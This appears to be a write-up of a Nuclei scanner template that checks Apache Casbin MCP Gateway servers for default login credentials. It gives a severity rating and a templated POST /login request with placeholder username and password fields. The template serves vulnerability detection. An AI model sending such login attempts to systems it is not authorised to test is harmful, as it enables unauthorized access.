# Nuclei Template: Apache Casbin MCP Gateway - Default Login
**Template ID:** apache-casbin-mcp-gateway-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`apache-casbin-mcp-gateway-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Apache Casbin MCP Gateway server default login credentials were discovered.

## Steps to reproduce / Exploit Payload
```http
POST /login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{"username":"{{username}}","password":"{{password}}"}
```

## References
- https://github.com/apache/casbin-mcp-gateway
